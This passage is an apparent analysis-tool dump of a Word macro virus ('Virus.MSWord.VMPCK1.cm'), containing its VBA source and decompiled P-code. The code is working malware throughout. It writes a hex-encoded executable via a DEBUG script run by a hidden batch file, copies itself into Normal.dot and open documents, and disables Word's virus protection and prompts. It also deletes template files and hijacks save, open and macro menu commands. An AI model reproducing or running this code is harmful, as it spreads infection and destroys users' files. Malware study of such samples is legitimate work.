Print #hFile, "E 0FC0 00 31 00 03 01 D9 09 02 00 2A 00 03 01 C5 0A 01"
Print #hFile, "E 0FD0 00 33 00 03 01 DD 0A 01 00 34 00 03 01 78 09 02"
Print #hFile, "E 0FE0 00 AE 00 03 01 75 0A 01 00 39 00 03 01 51 0B 02"
Print #hFile, "E 0FF0 00 31 00 03 01 A5 0A 01 00 3B 00 03 01 55 0A 02"
Print #hFile, "E 1000 00 B3 00 03 01 0A 0B 02 00 36 00 03 01 2C 0C 02"
Print #hFile, "E 1010 00 38 00 03 01 9F 09 02 00 39 00 03 01 2A 0B 02"
Print #hFile, "E 1020 00 3A 00 05 01 10 00 01 00 B2 00 03 01 1E 00 01"
Print #hFile, "E 1030 00 5B 00 03 01 8C 02 01 00 66 00 03 01 48 0A 02"
Print #hFile, "E 1040 00 6B 00 03 01 0A 0A 02 00 6C 00 00 00 00 00 00"
Print #hFile, "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1060 00 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 01 00 FF FF"
Print #hFile, "E 1080 00 00 00 00 5F 43 5F 46 49 4C 45 5F 49 4E 46 4F"
Print #hFile, "E 1090 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 01"
Print #hFile, "E 10B0 00 00 14 00 14 00 28 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 C1 00 00 00"
Print #hFile, "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10E0 00 00 00 00 00 00 8A 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10F0 00 00 00 00 00 00 00 10 01 00 00 00 00 00 00 00"
Print #hFile, "E 1100 00 00 41 6C 6F 61 70 00 41 6C 6F 61 70 20 41 70"
Print #hFile, "E 1110 70 20 41 6C 72 65 61 64 79 20 52 75 6E 6E 69 6E"
Print #hFile, "E 1120 67 00 61 6C 6F 61 70 69 63 6F 00 00 41 4C 4F 41"
Print #hFile, "E 1130 50 57 6E 64 43 6C 61 73 73 00 41 6C 6F 61 70 20"
Print #hFile, "E 1140 57 69 6E 64 6F 77 00 00 54 69 6D 65 72 00 25 64"
Print #hFile, "E 1150 00 00 20 53 74 65 66 61 6E 6F 20 50 65 72 6F 74"
Print #hFile, "E 1160 74 6F 20 2D 20 31 39 39 34 00 50 72 6F 6A 65 63"
Print #hFile, "E 1170 74 00 23 33 32 37 37 32 00 00 00 00 00 00 00 00"
Print #hFile, "E 1180 00 00 00 00 00 00 00 00 3C 3C 4E 4D 53 47 3E 3E"
Print #hFile, "E 1190 00 00 52 36 30 30 30 0D 0A 2D 20 73 74 61 63 6B"
Print #hFile, "E 11A0 20 6F 76 65 72 66 6C 6F 77 0D 0A 00 03 00 52 36"
Print #hFile, "E 11B0 30 30 33 0D 0A 2D 20 69 6E 74 65 67 65 72 20 64"
Print #hFile, "E 11C0 69 76 69 64 65 20 62 79 20 30 0D 0A 00 09 00 52"
Print #hFile, "E 11D0 36 30 30 39 0D 0A 2D 20 6E 6F 74 20 65 6E 6F 75"
Print #hFile, "E 11E0 67 68 20 73 70 61 63 65 20 66 6F 72 20 65 6E 76"
Print #hFile, "E 11F0 69 72 6F 6E 6D 65 6E 74 0D 0A 00 12 00 52 36 30"
Print #hFile, "E 1200 31 38 0D 0A 2D 20 75 6E 65 78 70 65 63 74 65 64"
Print #hFile, "E 1210 20 68 65 61 70 20 65 72 72 6F 72 0D 0A 00 14 00"
Print #hFile, "E 1220 52 36 30 32 30 0D 0A 2D 20 75 6E 65 78 70 65 63"
Print #hFile, "E 1230 74 65 64 20 51 75 69 63 6B 57 69 6E 20 65 72 72"
Print #hFile, "E 1240 6F 72 0D 0A 00 08 00 52 36 30 30 38 0D 0A 2D 20"
Print #hFile, "E 1250 6E 6F 74 20 65 6E 6F 75 67 68 20 73 70 61 63 65"
Print #hFile, "E 1260 20 66 6F 72 20 61 72 67 75 6D 65 6E 74 73 0D 0A"
Print #hFile, "E 1270 00 15 00 52 36 30 32 31 0D 0A 2D 20 6E 6F 20 6D"
Print #hFile, "E 1280 61 69 6E 20 70 72 6F 63 65 64 75 72 65 0D 0A 00"
Print #hFile, "E 1290 FC 00 0D 0A 00 FF 00 72 75 6E 2D 74 69 6D 65 20"
Print #hFile, "E 12A0 65 72 72 6F 72 20 00 02 00 52 36 30 30 32 0D 0A"
Print #hFile, "E 12B0 2D 20 66 6C 6F 61 74 69 6E 67 2D 70 6F 69 6E 74"
Print #hFile, "E 12C0 20 73 75 70 70 6F 72 74 20 6E 6F 74 20 6C 6F 61"
Print #hFile, "E 12D0 64 65 64 0D 0A 00 FF FF FF 00 00 00 00 00 00 00"
Print #hFile, "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1340 00 00 01 00 01 00 20 20 10 00 01 00 04 00 E8 02"
Print #hFile, "E 1350 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1360 28 00 00 00 20 00 00 00 40 00 00 00 01 00 04 00"
Print #hFile, "E 1370 00 00 00 00 80 02 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00"
Print #hFile, "E 1390 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00"
Print #hFile, "E 13A0 80 80 00 00 80 80 80 00 C0 C0 C0 00 00 00 FF 00"
Print #hFile, "E 13B0 00 FF 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00"
Print #hFile, "E 13C0 FF FF 00 00 FF FF FF 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13D0 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 13E0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 13F0 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1400 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1410 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1420 FF FF FF FF F9 FF FF 00 FF F9 99 9F FF FF FF FF"
Print #hFile, "E 1430 FF FF FF FF 9F 9F FF 00 FF FF FF F9 99 9F FF FF"
Print #hFile, "E 1440 FF FF FF F9 FF F9 FF 00 FF FF FF FF FF 9F FF FF"
Print #hFile, "E 1450 FF FF FF 9F FF FF FF 00 FF FF FF FF FF F9 FF FF"
Print #hFile, "E 1460 FF FF F9 FF FF FF FF 00 FF FF FF FF FF F9 9F FF"
Print #hFile, "E 1470 FF FF F9 FF FF FF FF 00 FF FF FF FF FF FF 9F FF"
Print #hFile, "E 1480 FF FF 99 FF FF FF FF 00 FF FF FF FF FF FF 99 99"
Print #hFile, "E 1490 99 99 9F FF FF FF FF 00 FF FF FF FF FF FF F9 99"
Print #hFile, "E 14A0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF F9 99"
Print #hFile, "E 14B0 FF FF FF FF FF FF FF 00 FF FF FF 9F FF FF FF 99"
Print #hFile, "E 14C0 9F FF FF F9 FF FF FF 00 FF FF FF F9 FF FF FF F9"
Print #hFile, "E 14D0 9F FF FF 9F 9F FF FF 00 FF FF FF FF 9F FF FF FF"
Print #hFile, "E 14E0 99 FF 99 FF F9 FF FF 00 FF FF FF FF F9 FF FF FF"
Print #hFile, "E 14F0 99 F9 FF FF FF 9F FF 00 FF FF FF FF FF 9F FF FF"
Print #hFile, "E 1500 99 9F FF FF FF FF FF 00 FF FF FF FF FF F9 99 99"
Print #hFile, "E 1510 99 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1520 FF 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1530 FF 99 99 FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1540 FF F9 99 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1550 FF F9 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1560 FF FF 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1570 FF FF F9 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1580 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1590 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 15A0 FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15C0 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 03"
Print #hFile, "E 15D0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 15E0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 15F0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1600 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1610 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1620 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1630 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1640 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00"
Print #hFile, "RCX"
Print #hFile, "1550"
Print #hFile, "W"
Print #hFile, "Q"
    Close hFile
End Sub
Sub startv(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy start.com start.exe"
Print #hFile, "del start.com"
Print #hFile, "del start.scr"
Print #hFile, "start"
Print #hFile, "del start.com"
Print #hFile, "del startv.bat"
Close hFile
Shell ("c:\startv.bat"), vbHide
End Sub
Sub zap(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "del c:\progra~1\micros~1\office\startup\*.dot"
Print #hFile, "del c:\progra~1\micros~1\templa~1\*.dot"
Print #hFile, "del zap.bat"
Close hFile
Shell ("c:\windows\zap.bat"), vbHide
End Sub
Sub FileOpen()
On Error Resume Next
WBT
If Dialogs(80).Show <> 0 Then
'Call AutoOpen
Dockenor
Norkedoc
Call Umang_Fa
WBF
Else
WBF
End If
End Sub
Sub pesen()
msg1 = "Eh....kamu Kurang Ajar dibilangin"
msg2 = "Nah..... Gue Murka... Gue sumpahin"
msg3 = "..........GEMPA BUMI .............."
MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + msg3)
End Sub
Sub ultah()
Do
nama1 = "Unang Triwidhiyanti"
Nama2 = "Nur firmanullah"
msg1 = "Hari ini hari yang berbahagia buat temanku "
msg2 = "Jadi Elo-elo pade Nggak usah ngetik yang buat elo pusing deh...."
msg3 = "Mendingan Elo sekarang matiin komputer terus tidur dan istirahat "
msg4 = "Tapi Jangan Lupa Loh... Ucapin selamat Ulang tahun Buat "
If Month(Now()) = 1 And Day(Now()) = 9 Then MsgBox msg1 + nama1 + Chr(10) + msg2 + Chr(10) + msg3 + nama1, vbInformation, "Pesen Mimang"
If Month(Now()) = 11 And Day(Now()) = 16 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Nama2, vbInformation, "Pesen Mimang"
Loop
End Sub
Function Dockenor()
    On Error GoTo Erw1
    Norok = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "Umang_Fa" Then Norok = True
      If (NMacr <> "Umang_Fa") And (NMacr <> "ThisDocument") Then
      MsgBox ("Normal Template Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Virus Makro akan dihapus dan tunggu Sejenak"), vbInformation, "Pesen Mimang"
  Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems

      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "Umang_Fa", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function Norkedoc()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "Umang_Fa" Then Dokok = True
      'NMacr = NT.VBProject.VBComponents(i).Name
      'If NMacr = "Umang_Fa" Then Dokok = True
      If (NMacr <> "Umang_Fa") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       MsgBox ("Documen Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Virus Makro akan dihapus dan tunggu Sejenak"), vbInformation, "Pesen Mimang"
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "Umang_Fa", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Function sim()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("Umang_Fa").Export "c:\windows\system\vxd.sys"
If f56879025 = vbReadOnly Then GoTo bodo
If f56879025 = vbReadOnly + vbArchive Then GoTo bodo
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Umang_Fa" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Umang_Fa" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\system\vxd.sys"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
bodo:
End Function


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPCK1.cm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Umang_Fa - 55255 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn NT (As Object)
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	OnError hapus 
' Line #3:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #4:
' 	ArgsCall Dockenor 0x0000 
' Line #5:
' 	ArgsCall Create_Loader 0x0000 
' Line #6:
' 	ArgsCall Norkedoc 0x0000 
' Line #7:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #12:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #18:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #19:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #20:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad 
' Line #21:
' 	LitStr 0x0008 "Umang_Fa"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ModuleLength 
' Line #22:
' 	Ld NT 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	Ld Pad 
' 	LitStr 0x0008 "\Fax.txt"
' 	Paren 
' 	Add 
' 	LitStr 0x0008 "Umang_Fa"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #25:
' 	ArgsCall Umang_Fa 0x0000 
' Line #26:
' 	Label Label_Exit 
' Line #27:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #28:
' 	QuoteRem 0x0000 0x0031 "CommandBars("Format").Controls("Style...").Delete"
' Line #29:
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Create_Loader 0x0000 
' 	EndIf 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #31:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #32:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #33:
' 	Label hapus 
' Line #34:
' 	ArgsCall Dockenor 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub Create_Loader())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	LitStr 0x000A "C:\Windows"
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #39:
' 	LitStr 0x000E "C:\Windows\inf"
' 	Ld wdTempFilePath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #40:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad1 
' Line #41:
' 	Ld Pad1 
' 	LitStr 0x0008 "\Fax.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St MyFile 
' Line #42:
' 	Ld MyFile 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #43:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set aDoc 
' Line #44:
' 	StartWithExpr 
' 	Ld aDoc 
' 	With 
' Line #45:
' 	Ld Pad1 
' 	LitStr 0x0008 "\Fax.dot"
' 	Add 
' 	ParamNamed FileName 
' 	ArgsMemCallWith SaveAs 0x0001 
' Line #46:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	ArgsMemCallWith Close 0x0001 
' Line #47:
' 	EndWith 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub Umang_Fa())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	QuoteRem 0x0000 0x0008 "Dockenor"
' Line #53:
' 	ArgsCall Norkedoc 0x0000 
' Line #54:
' 	QuoteRem 0x0000 0x0008 "Call sim"
' Line #55:
' 	ArgsCall (Call) Create_Loader 0x0000 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #60:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) ultah 0x0000 
' 	EndIf 
' Line #61:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) ultah 0x0000 
' 	EndIf 
' Line #62:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #63:
' 	LitStr 0x0021 "Phurbaranji ....... Bandarlampung"
' 	MemStWith Author 
' Line #64:
' 	LitStr 0x0020 "Word Macro Virus.... it just fun"
' 	MemStWith Title 
' Line #65:
' 	LitStr 0x0029 "Dedicate for My Lv Umang_Fa Triwidhiyanti"
' 	MemStWith Subject 
' Line #66:
' 	LitStr 0x0067 "Virus ini tidak berbahaya anda jangan coba-coba merubah atau menggunakan Tools|Macro Ntar tau akibatnya"
' 	MemStWith Comments 
' Line #67:
' 	ArgsMemCallWith Execute 0x0000 
' Line #68:
' 	EndWith 
' Line #69:
' 	Label bodo 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub FileSave())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	ArgsCall Norkedoc 0x0000 
' Line #74:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #76:
' 	ArgsCall Umang_Fa 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileClose())
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	ArgsCall Norkedoc 0x0000 
' Line #81:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #83:
' 	ArgsCall Umang_Fa 0x0000 
' Line #84:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileSaveAs())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	ArgsCall Norkedoc 0x0000 
' Line #89:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #90:
' 	ArgsCall Umang_Fa 0x0000 
' Line #91:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileExit())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	ArgsCall Norkedoc 0x0000 
' Line #96:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #97:
' 	ArgsCall Umang_Fa 0x0000 
' Line #98:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #99:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub AutoExit())
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	ArgsCall Norkedoc 0x0000 
' Line #104:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #105:
' 	ArgsCall Umang_Fa 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub AutoExec())
' Line #108:
' 	OnError hapus 
' Line #109:
' 	ArgsCall Norkedoc 0x0000 
' Line #110:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #111:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	ArgsCall (Call) zap 0x0001 
' Line #112:
' 	ArgsCall (Call) sim 0x0000 
' Line #113:
' 	ArgsCall Umang_Fa 0x0000 
' Line #114:
' 	ArgsCall WBF 0x0000 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #116:
' 	ArgsCall WBF 0x0000 
' Line #117:
' 	Label hapus 
' Line #118:
' 	ArgsCall Dockenor 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub AutoClose())
' Line #121:
' 	OnError (Resume Next) 
' Line #122:
' 	ArgsCall Norkedoc 0x0000 
' Line #123:
' 	QuoteRem 0x0004 0x0008 "Dockenor"
' Line #124:
' 	ArgsCall Umang_Fa 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub ToolsMacro())
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' 	ArgsCall Umang_Fa 0x0000 
' Line #129:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "C:\start.scr"
' 	ArgsCall (Call) p5687 0x0001 
' 	EndIf 
' Line #130:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "c:\startv.bat"
' 	ArgsCall (Call) startv 0x0001 
' 	EndIf 
' Line #131:
' 	ArgsCall (Call) pesen 0x0000 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub FileTemplates())
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	ArgsCall Umang_Fa 0x0000 
' Line #136:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "C:\start.scr"
' 	ArgsCall (Call) p5687 0x0001 
' 	EndIf 
' Line #137:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "c:\startv.bat"
' 	ArgsCall (Call) startv 0x0001 
' 	EndIf 
' Line #138:
' 	ArgsCall (Call) pesen 0x0000 
' Line #139:
